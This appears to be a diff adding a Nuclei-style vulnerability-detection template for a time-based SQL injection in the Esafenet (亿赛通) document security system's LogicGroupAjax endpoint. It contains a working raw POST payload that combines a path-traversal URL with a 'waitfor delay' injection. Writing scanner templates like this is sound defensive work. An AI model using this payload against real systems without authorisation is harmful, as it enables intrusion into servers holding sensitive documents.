@@ -1,0 +1,37 @@
+id: poc-yaml-yisaitong-esafenet-logicgroupajax-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 LogicGroupAjax SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: 亿赛通电子文档安全管理系统
+  description: |
+    This template identifies an SQL injection vulnerability in the 亿赛通电子文档安全管理系统 LogicGroupAjax endpoint.
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+http:
+  - raw:
+      - |
+        POST /CDGServer3/js/../LogicGroupAjax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=isExist&logicGroupName=-1'waitfor delay '0:0:{{t1}}'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "CDGServer3"
+        part: header
+      - type: word
+        words:
+          - "false"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1) && duration < to_number(t2)"
